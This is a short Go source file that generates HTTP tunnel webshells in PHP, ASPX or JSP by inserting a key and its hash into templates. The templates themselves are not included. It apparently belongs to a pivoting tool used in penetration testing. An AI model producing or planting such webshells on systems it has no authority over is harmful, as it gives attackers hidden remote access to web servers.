// Package webshell generates HTTP tunnel webshells for PHP, ASPX, and JSP.
//
// The generated webshells implement the same HTTP tunnel protocol as the
// Go httptunnel server, allowing the burrow httptunnel client to connect
// through an existing web server without deploying a separate binary.
package webshell

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"strings"
)

// Format represents the output language for the webshell.
type Format string

const (
	FormatPHP  Format = "php"
	FormatASPX Format = "aspx"
	FormatJSP  Format = "jsp"
)

// ValidFormats returns all supported webshell formats.
func ValidFormats() []Format {
	return []Format{FormatPHP, FormatASPX, FormatJSP}
}

// Config holds generation parameters.
type Config struct {
	Format Format // Output language (php, aspx, jsp)
	Key    string // Shared encryption/authentication key
}

// Generate produces the webshell source code for the given configuration.
// The returned string is a complete, self-contained file ready for deployment.
func Generate(cfg Config) (string, error) {
	if cfg.Key == "" {
		return "", fmt.Errorf("key is required")
	}

	keyBytes := []byte(cfg.Key)
	keyHex := hex.EncodeToString(keyBytes)
	authHash := sha256.Sum256(keyBytes)
	authHex := hex.EncodeToString(authHash[:])

	var tmpl string
	switch cfg.Format {
	case FormatPHP:
		tmpl = phpTemplate
	case FormatASPX:
		tmpl = aspxTemplate
	case FormatJSP:
		tmpl = jspTemplate
	default:
		return "", fmt.Errorf("unsupported format: %q (valid: php, aspx, jsp)", string(cfg.Format))
	}

	out := strings.ReplaceAll(tmpl, "__KEY_HEX__", keyHex)
	out = strings.ReplaceAll(out, "__AUTH_HEX__", authHex)
	return out, nil
}
